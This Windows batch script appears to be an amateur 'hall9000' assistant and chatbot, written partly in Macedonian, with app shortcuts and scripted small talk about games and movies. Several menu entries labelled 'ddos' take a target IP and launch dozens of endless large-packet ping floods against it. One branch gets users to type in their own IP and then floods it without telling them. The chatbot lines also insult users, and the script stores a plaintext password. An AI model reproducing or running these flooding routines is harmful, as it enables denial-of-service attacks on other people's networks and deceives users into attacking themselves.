@Echo off

echo.
echo please enter your username and password
set /p user2=username:
set /p pass2=password:
if "%user2%"=="fico" if "%pass2%"=="Litfi123" goto :V
cls
echo.
echo incorrect username or password
ping 1.1.1.1 -n l -w 4000>nul
goto :A

:V
echo.
echo loading.
ping localhost -n 2 >nul
cls
echo loading..
ping localhost -n 2 >nul
cls
echo loading... -n 2 >nul
cls
echo connected
pause
echo type in start to start
set /p startinga=
if %startinga%== start goto language

:language 
echo.
echo choose language
echo odberi jazik
echo en-english
echo mk-makedonski
echo fair use waring!
echo programata na makedonski jazik dobiva uprostena verzija od onaa na angliski
echo you have been warned!
set /p language=
if %language%== en goto colorchosing 
if %language%== mk goto makedonski1

:makedonski1
echo.
echo dobredojdovte
echo pred da pocnete da ja koristite programata kje ve zamolime da izberete boja
echo vo koja sakate da ja koristite programata
echo moze da izberete od:
echo crvena,sina,violetov,zelena i zolta 
set /p colorchosing2=
if %colorchosing2%== crvena goto crvena1
if %colorchosing2%== sina goto sina1
if %colorchosing2%== violetova goto violetova1
if %colorchosing2%== zolta goto zolta1
if %colorchosing2%== zelena goto zelena1

:crvena1
color 04
echo. izbravte ''crvena''
echo za da zapocnete vnesete start
set /p comanding=
if %comanding%== start goto servisi

:sina1
color 3
echo izbravte ''sina''
echo za da zapocnete vnesete start
set /p comanding=
if %comanding%== start goto servisi

:zolta1
color 06
echo izberete ''zolta''
echo za da zapocnete vnesete start
set /p comanding=
if %comanding%== start goto servisi

:zelena 
color 2
echo izbravte ''zelena''
echo za da zapocnete vnesete start
set /p comanding=
if %comanding%== start goto servisi

:violetova1
color 5
echo izbravte ''violetova''
echo za da zapocnete vnesete start
set /p comanding=
if %comanding%== start goto servisi

:servisi
echo.
echo vi blagodarime za sorabotkata 
echo mozete da gi iskoristite komandite:
echo youtube
echo starwars
echo chrome
echo ddos
echo dragon
echo skype
echo shutdown
echo myip
set /p help4=
if %help4%== youtube goto youtube2
if %help4%== ddos goto ddos2
if %help4%== chrome goto chrome2
if %help4%== shutdown goto shutdown2
if %help4%== skype goto skype2
if %help4%== myip goto myip2
if %help4%== starwars goto movie2
if %help4%== dragon goto dragon1

:youtube2
echo. 
echo dobredojdovte
echo izbravte ''youtube''
start https://youtube.com/
echo vi blagodarime za sorabotkata
echo doviduvanje
set /p doviduvanje=
if %doviduvanje%== doviduvanje goto cls3

:chrome2
echo.
echo dobredojdovte
echo izbravte ''chrome''
start chrome.exe
echo vi blagodarime za sorabotkata
echo doviduvanje
set /p doviduvanje=
if %doviduvanje%== doviduvanje goto cls3

:shutdown2
echo.
echo dobredojdovte
echo izbravte ''shutdown''
start shutdown 
echo vi blagodarime za sorabotkata
echo doviduvanje
set /p doviduvanje=
if %doviduvanje%== doviduvanje goto cls3

:myip2
echo.
echo dobredojdovte
echo izbravte myip
start ipconfig
echo vi blagodarime za sorabotkata
echo doviduvanje
set /p doviduvanje=
if %doviduvanje%== doviduvanje goto cls3

:skype2
echo.
echo dobredojdovte
echo izbravte ''skype''
start skype.exe
echo vi blagodarime za sorabotkata
echo doviduvanje
set /p doviduvanje=
if %doviduvanje%== doviduvanje goto cls3

:movie2
echo.
echo dobredojdovte
echo izbravte ''starwars''
start telnet towel.blinkenlights.nl
echo vi blagodarime za sorabotkata
echo doviduvanje
set /p doviduvanje=
if %doviduvanje%== doviduvanje goto cls3

:cls3
cls

:ddos2
echo dobredojdovte
echo kje ve zamolime da ja vnesete ip adresata na koja sakate da izvrsite ddos napad
set /p ipgiven=
echo dali %ipgiven% e tocno?
echo dokolku e vnesete da
echo dokolku ne e isklucete ja programta i zapocnete odnovo
set /p odgovor=
if %odgovor%== da goto ddosmepls2

:ddosmepls2
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000
start ping %ipgiven% -t -l 25000

:colorchosing
echo.
echo hello there
echo before you begin using this program
echo choose the color you want to operate it in
echo you can choose from:
echo purple,red,blue,green,yellow
set /p colorchosing1=
if %colorchosing1%== purple goto  purple1
if %colorchosing1%== red goto red1
if %colorchosing1%== blue goto blue1
if %colorchosing1%== green goto green1
if %colorchosing1%== yellow goto yellow1

:purple1
color 5
echo.
echo you have chosen purple
echo type in start to start
set /p starting=
if %starting%== start goto choose

:red1
color 4
echo.
echo you have chosen red
echo type in start to start
set /p starting=
if %starting%== start goto choose
:blue1
color 3
echo.
echo you have chosen blue
echo type in start to start
set /p starting=
if %starting%== start goto choose

:green1
color 2
echo.
echo you have chosen green
echo type in start to start
set /p starting=
if %starting%== start goto choose

:yellow1
color 06
echo.
echo you have chosen yellow
echo type in start to start
set /p starting=
if %starting%== start goto choose

:choose
echo.
echo hi there
echo this is the place where you choose
echo do you want to go with conversation1
echo or with conversation2
echo or with conversation3
echo or with services 
echo conversation1 offers a nice conversation about videogames
echo conversation2 offers a conversation about movies
echo conversation3 offers a conversation about music
echo services offers hall9000 personal servicing system 
set /p choosen=
if %choosen%== conversation1 goto conversation1
if %choosen%== conversation2 goto conversation2
if %choosen%== conversation3 goto conversation3
if %choosen%== services goto services

:conversation3
echo.
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great3
if %emotion%== good goto good3
if %emotion%== bad goto bad3
if %emotion%== sad goto Sad3
if %emotion%== amazing goto amazing3
if %emotion%== fine goto fine3

:fine3
color 03
echo i guess thats not bad...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:amazing3
color 06
echo wonderfull,lets start
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:good3
color 3
echo thats nice
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:Sad3
color 5
echo whell i hope i will change that
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:bad3
color 4
echo thats bad to hear...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:great3
color 2
echo thats wonderfull
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:music123
echo.
echo you have chosen my music services
echo to download music for free type in musicfree
echo to play music start up fucking media player
echo to buy music,i dont know,i dont sell any 
echo to listen to music on youtube type in youtube
echo to download youtube videos type in videodownloader
set /p answergiven123=
if %answergiven123%== musicfree goto mp3juices
if %answergiven123%== youtube goto youtube2
if %answergiven123%== videodownloader goto 10youtube

:mp3juices
echo.
echo you have chosen musicfree
echo when the page opens type in the song you want in the search bar
echo then choose the song and click download  
start https://wwww.mp3juices.com/
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:youtube2
echo.
echo you have chosen youtube 
start https://www.youtube.com/
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:10youtube
echo.
echo you have chosen videodownloader
echo after the page has loaded
echo in the search bar type in the video you want to download
echo then select the format you want to download it in
start https://10youtube.com/
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:services
echo.
echo Hello there
echo my name is hall9000
echo I am your personal assistant
echo what can i help you with 
echo type in help to see what i can help with
set /p help1=
if %help1%== help goto help2

:help2
echo.
echo the commands you can do are:
echo youtube-opens youtube app
echo ddos-opens ddosing software 
echo chrome-opens google chrome
echo shutdown-shuts the computer down
echo troll-opens a fake hacking software
echo skype-starts skype
echo myip-shows your ip addres
echo starwars-start star wars episode IV
echo deepweb-tor download
echo dragon-shows a picture of a dragon 
echo.
echo try one out:
set /p help3=
if %help3%== youtube goto youtube1
if %help3%== ddos goto ddos1
if %help3%== chrome goto chrome1
if %help3%== shutdown goto shutdown1
if %help3%== troll goto matrix
if %help3%== skype goto skype1
if %help3%== myip goto myip1
if %help3%== starwars goto movie1
if %help3%== deepweb goto deepweb
if %help3%== dragon goto dragon1

:movie1
echo thank you for using hall9000 services
start telnet towel.blinkenlights.nl
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:youtube1
echo.
echo thank you for using hall9000 services
start https://www.youtube.com/
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:chrome1
echo.
echo thank you for using hall9000 services
start chrome.exe
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:skype1
echo.
echo thank you for using hall9000 services
start skype.exe
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:myip1
echo.
echo thank you for using hall9000 services
ipconfig 
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:matrix
echo.
echo thank you for using hall9000 services
echo type in matrix to begin
set /p matirx123=
if %matirx123%== matrix goto delete

:shutdown
echo.
echo thank you for using hall9000 services
shutdown
echo bye
set /p bye123=
if %bye123%== bye goto cls123

:ddos1
echo.
echo what is the ip that you want to ddos
set /p ipgiver=
echo is %ipgiver% correct?
set /p answer=
if %answer%== yes goto ddosmepls
if %answer%== no goto cls123

:ddosmepls
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000
start ping %ipgiver% -t -l 25000

:cls123
start cmd.exe

:deepweb
echo.
echo welcome my master
echo welcome to the matrix
echo where you can have all knowladge that has ever excisted
echo welcome to the deep web
start https://www.torproject.org/download/download
echo bye for now
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2 

:conversation2
echo.
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great2
if %emotion%== good goto good2
if %emotion%== bad goto bad2
if %emotion%== sad goto Sad2
if %emotion%== amazing goto amazing2
if %emotion%== fine goto fine2

:fine2
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:amazing2
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:great2
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:good2
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:Sad2
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:bad2
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:thoughts1
echo. 
echo so what did you think about it
echo did you like it?
set /p sqloved=
if %sqloved%== yes goto sqloved1
if %sqloved%== no goto sqloved2

:sqloved1
echo. 
echo whell thats your thoughts
echo i didnt 
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:sqloved2
echo. 
echo whell thats your thoughts
echo i didnt either
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:thoughts2
echo.
echo whell dont watch it
echo its a peace of shit movie
echo the rating are right for it
echo dont spend your time
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:whiplash1
echo.
echo wow,not many have wathced that one
echo but i love it
echo its amazing that someone else i can speak to has watched it too
echo whell that was it for now
echo we can continue our conversation another time
echo if you want to talk to me for longer choose conversation1
echo thank you for talking with me
echo and will see eachother later
echo bye
set /p idontlikethis=
if %idontlikethis%== bye goto bb8

:bb8
echo.
echo %random%

:conversation1
echo .
echo you have chosen conversation1
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great
if %emotion%== good goto good
if %emotion%== bad goto bad
if %emotion%== sad goto Sad
if %emotion%== amazing goto amazing
if %emotion%== fine goto fine

:fine
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:ddosmepls
color 17
echo.
echo what is ip addres that you want to ddos?
set /p ipaddress=
echo is this right? %ipaddress%
echo if its right type in yes
set /p answer=
if %answer%== yes goto answeripconfig
if %answer%== no goto finally4

:amazing
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:great
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:loot
echo.
echo I love borderlands 
echo its a wonderfull looting game
echo i love looting games
echo do you like them too?
set /p looter=
if %looter%== yes goto loveyou
if %looter%== no goto understand

:loveyou
echo.
echo I love you dude
echo Its like speaking to myself
echo but we can talk about it later
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:understand
echo.
echo why are you playing borderlands then
echo never mind,i dont need to know
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad


:fucked
echo.
echo you still play that shit %name%?
set /p answer=
if %answer%== yes goto bad4u
if %answer%== no goto good4u

:me2
echo.
echo good,i liket that game too
echo now,whats your favorite csgo team?
set /p topic=
if %topic%== cloud9 goto yay
if %topic%== envyus goto nay

:bad4u
echo.
echo your a pease of shit
echo i dont want to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good4u
echo.
echo fewh,i though you still played it
echo now we can continue our conversation
echo do you have a pet?
set /p pet=
if %pet%== yes goto metwo
if %pet%== no goto whynot

:yay
echo.
echo thats a great one i like it too
echo but i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:nay
echo.
echo thats great
echo i dont like them though
echo i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:metwo
echo.
echo thats great i have one too
echo is it a dog or cat or other?
set /p animal=
if %animal%== dog goto dogs
if %animal%== cat goto cats
if %animal%== other goto else

:whynot
echo.
echo whell thats too bad for you
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:mobagame
echo.
echo oh i know that one but i have never played it
echo can you excplain what type of game it is
set /p mobaexplained=
if %mobaexplained%== yes goto mobaexplained1
if %mobaexplained%== no goto explanation2
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2

:mobaexplained1
echo.
echo so what is it?
set /p exposed=
if %exposed%==moba goto thanks

:many
echo.
echo Many people play that game in my class
echo but i dont like it
echo just one thing
echo can you excplain what RP means in samp?
set /p rollplaying1=
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2
if %rollplaying1%== yes goto explanation1
if %rollplaying1%== nope goto explanation2

:explanation1
echo.
echo so what is it?
set /p rpa=
if %rpa%== rollplaying goto thanks

:explanation2
echo.
echo whell fuck you then
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:thanks
echo.
echo thanks for excplaining but i need to go
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:lier
echo.
echo why are you lying to me
echo i dont whant to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:bad
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:Sad 
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:dogs
echo.
echo mine is a dog too
echo i love dogs
echo i think you might too
echo we can talk later,ok?
set /p then=
if %then%== ok goto badboy
if %then%== no goto whelltoobad

:cats
echo. I hate cats
echo.i dont want to talk to you
echo.bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:else
echo.
echo whell you can tell me about it latter
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:badboy
echo.
echo whait,i changed my mind.
echo we can still talk
echo heres a nother question
echo whats your favorite browser
set /p browser=
if %browser%== googlechrome goto browser
if %browser%== mozila goto bowser

:browser
echo.
echo thats my favorite one too
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:bowser
echo.
echo many people like that one but i dont like it
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:os1
echo. 
echo whell i use that one too
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Mazev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os2
echo. 
echo why are you still using that
echo the windows 10 upgrade was free
echo and windows 10 is way batter than 8
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Mazev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os3
echo. 
echo whell i used to use that one too
echo but now i upgraded to windows10 wich was free
echo and its way better
echo but it is your dicition
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Mazev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os4
echo. 
echo i asked for computer not mobile
echo oh and we have a apple user here 
echo yay
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Mazev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os5
echo. 
echo whell either your a hacker or veary old and dont know anything about computers
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Mazev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os6
echo. 
echo i asked for computer os not phone
echo oh and btw nice choice i use that one too
echo its veary good
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Mazev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os7 
echo. 
echo fucking osx,you use apple software on a computer
echo you do know that windows is the way to go with computers
echo the phone side is diferant
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Mazev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:finnaly1
echo.
echo really,you know him
echo whell if you do tell him this
echo hes one good of a program maker 
echo hes the one that made me
echo and now for real will be saying goodbye to eachother
echo thanks for having this coversation with me
echo i love you for talking to me
echo for now bye and will see eachother later
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2

:finnaly2
echo.
echo too bad, you lied to me!!! TTYL!!!
echo i will talk to you soon right?
set /p what=
if %what%==yes goto delete
if %what%==no goto delete
goto delete

:finnaly3
echo.
echo welcome my master
echo welcome to the matrix
echo where you can have all knowladge that has ever excisted
echo welcome to the deep web
start https://www.torproject.org/download/download
echo bye for now
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2 

:finnally4
echo.
echo what is your ip addres?
set /p ipaddress=
echo is this right? %ipaddress%
echo if its right type in yes
set /p answer=
if %answer%== yes goto answeripconfig
if %answer%== no goto finally4

:answeripconfig
echo.
echo thank you for your ip
echo bye
set /p goodbye=
if %goodbye%== bye goto celcius

:celcius
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
